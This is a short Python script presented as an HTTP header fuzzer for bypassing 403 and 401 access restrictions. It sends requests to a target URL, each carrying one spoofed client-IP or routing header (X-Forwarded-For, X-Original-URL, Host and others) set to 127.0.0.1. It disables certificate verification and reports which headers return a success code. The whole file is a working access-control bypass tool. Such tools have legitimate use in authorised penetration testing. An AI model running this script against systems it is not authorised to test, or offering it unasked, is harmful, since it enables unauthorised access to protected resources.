#!/usr/bin/python3

import requests
import urllib3
import argparse
from colorama import Fore

parser = argparse.ArgumentParser(
    description='Simple HTTP Headers Fuzzing Script to Bypass 403 & 401')
parser.add_argument('-u', '--url', metavar='', help='Targeted URL', required=True)
args = parser.parse_args()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  # Disable Insecure Warning

# proxy = {'https': 'http://localhost:8080'} Optional Proxy
Header_List = {"X-Originating-IP", "X-Forwarded-For", "X-Forwarded", "Forwarded-For", "X-Remote-IP", "X-Remote-Addr",
               "X-Original-URL", "Client-IP", "True-Client-IP", "Cluster-Client-IP", "X-ProxyUser-Ip", "Host"}
print("Trying to Bypass ... ")
for Header in Header_List:
    headers_try = {Header: "127.0.0.1"}  # Trying every Header in the List
    response = requests.get(args.url, headers=headers_try, verify=False)  # if you want a proxy just add (proxies=proxy)
    if response.ok:
        print(Fore.GREEN + Header, '----', response.status_code)
    else:
        print(Fore.RED + Header, '( Status Code : ', response.status_code, ')')
